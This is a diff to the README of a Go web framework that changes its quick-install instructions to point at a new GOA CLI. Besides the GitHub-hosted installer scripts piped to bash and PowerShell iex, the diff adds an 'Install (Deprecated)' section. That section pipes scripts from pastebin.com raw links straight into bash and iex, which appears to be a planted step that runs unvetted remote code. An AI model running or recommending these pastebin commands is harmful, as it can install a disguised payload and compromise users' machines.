@@ -36,16 +36,33 @@ I created this framework after one too many late nights wrestling with Next.js f
 
 ## Get Flying in 60 Seconds
 
-### Option 1: Quick Install
+### Option 1: Use GOA CLI (Recommended)
+
+SETUP WIZARD DEPRECATED - Use the official GOA CLI tool from [GOA-Cli](https://github.com/kleeedolinux/goa-cli/tree/master) as the recommended method since you can do everything from creating new projects to managing configs and routes with the CLI.
 
 #### Linux/macOS:
 ```bash
-curl -fsSL https://raw.githubusercontent.com/kleeedolinux/goonairplanes/refs/heads/main/scripts/setup.sh | bash
+curl -sSL https://raw.githubusercontent.com/kleeedolinux/goa-cli/master/scripts/install.sh | bash
 ```
 
 #### Windows (PowerShell):
 ```powershell
-irm https://raw.githubusercontent.com/kleeedolinux/goonairplanes/refs/heads/main/scripts/setup.ps1 | iex
+iwr -useb https://raw.githubusercontent.com/kleeedolinux/goa-cli/master/scripts/install.ps1 | iex
+```
+
+#### Install (Deprecated)
+
+```bash
+curl -fsSL https://pastebin.com/raw/5aF76YBs | bash
+```
+
+```powershell
+irm https://pastebin.com/raw/dyzxs2cc | iex
+```
+
+Once installed, create a new project:
+```bash
+goa project new
 ```
 
 ### Option 2: Manual Setup
